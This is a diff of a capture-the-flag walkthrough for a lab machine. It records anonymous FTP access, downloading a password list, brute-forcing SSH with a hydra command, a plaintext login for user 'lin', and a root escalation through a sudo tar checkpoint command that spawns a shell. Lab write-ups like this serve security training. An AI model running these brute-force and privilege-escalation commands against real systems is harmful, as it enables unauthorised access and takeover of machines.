@@ -1,37 +1,43 @@
-Scanned with enumeration.sh
+-Scanned with enumeration.sh (script in Pentesting repo)
     Open ports:
         21
         22
         80
         
-ftp is anonymous login
+-Checked ftp for anonymous login. It worked.
 
-Download task.txt
+-Downloaded task.txt
+    wget ftp://10.10.X.X/task.txt
 
-cat to view task.txt
+-cat to view task.txt
 
-lin wrote the file
+-lin wrote the file
 
-Download locks.txt
+-Download locks.txt
 
-cat locks.txt
+-cat locks.txt
 
-Seems to be a password file
+-Seems to be a password file
 
-hydra to exploit ssh
+-hydra to exploit ssh
+    hydra -l lin -P locks.txt ssh://10.10.X.X
 
-user=lin password=RedDr4gonSynd1cat3
+-user=lin password=RedDr4gonSynd1cat3
 
-sudo -l to see if theres sudo privileges
+-sudo -l to see if there's sudo privileges
 
-Can run tar as sudo
+-Can run tar as sudo
 
-search gtfobins for tar exploit
+-Search gtfobins for tar exploit
+    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+    
+-Run the command
 
-sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+-Type - whoami
+    root
 
-whoami - root
+-cd /root
 
-cd /root
+-ls
 
-cat root.txt
+-cat root.txt
